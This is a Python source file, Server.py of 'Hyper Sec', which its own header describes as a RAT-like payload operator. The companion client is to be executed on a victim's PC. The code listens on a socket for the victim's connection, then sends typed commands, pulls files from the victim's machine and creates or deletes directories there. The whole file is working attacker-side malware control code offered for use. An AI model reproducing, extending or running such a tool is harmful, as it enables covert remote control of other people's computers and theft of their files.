'''
 _   _                         ____
| | | |_   _ _ __   ___ _ __  / ___|  ___  ___
| |_| | | | | '_ \ / _ \ '__| \___ \ / _ \/ __|
|  _  | |_| | |_) |  __/ |     ___) |  __/ (__ _      ---- Server.py
|_| |_|\__, | .__/ \___|_|    |____/ \___|\___(_)
       |___/|_|


Creator - Udit Singh Dhakrey
Email - hunterprogaming590@gmail.com
Github - https://github.com/hackerX-OP

Tool name - Hyper Sec.
Tool description - Hyper sec is a basic RAT like payload operator build using python , it contain 2 files, 
1> Server.py
2> Client.py

    In that, client.py file must be execute in victims PC and the file send a request to server or attacker pc on which server.py must be executed.

Name of module used in this tools:
    1> Time: For printing time
    2> pyfiglet - For printing Heading
    3> Colorama - To color the text
    4>socket - The basic work of socket connection of networking.

        Thank You to using It...
    Also available on YouTube - Cyber Clauses 
'''

import time
import pyfiglet , colorama
import socket
import argparse


argparse = argparse.ArgumentParser()
argparse.add_argument('-i' , '--ip')
argparse.add_argument('-p' , '--port')

args= argparse.parse_args()
ip= args.ip
port = args.port

t1 = time.strftime('%H:%M:%S')
## Setting Socket
server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

#colorama 
colorama.init()

blue = colorama.Fore.BLUE
grenen = colorama.Fore.GREEN
red = colorama.Fore.RED
reset = colorama.Fore.RESET
bold = colorama.Style.BRIGHT


#Function for Heading

def heading():
    head = pyfiglet.figlet_format("Hyper Sec.")
    print(bold , grenen)
    print(head , reset)
    print(f"Current time is {t1}")

heading()
server.bind((ip,int(port)))


print("listening...")
server.listen(10)
c , addr = server.accept()
print(f" {red}Connected to {grenen}{addr}{reset}")


while True:
    inp = input(f"{blue}cmd@: Type Something:{reset} ")
    c.send(inp.encode())


    if inp.startswith('download'):
        a = c.recv(10240000)
        f = open('day1.pdf' , 'wb')
        f.write(a)
        f.close()


    elif inp=='exit': 
        print(f"Exiting...")
        break

    elif inp.startswith('mkdir'):

        c.send(inp.encode())
    elif inp.startswith('rmdir'):

        c.send(inp.encode())
    else: print(c.recv(100000000).decode())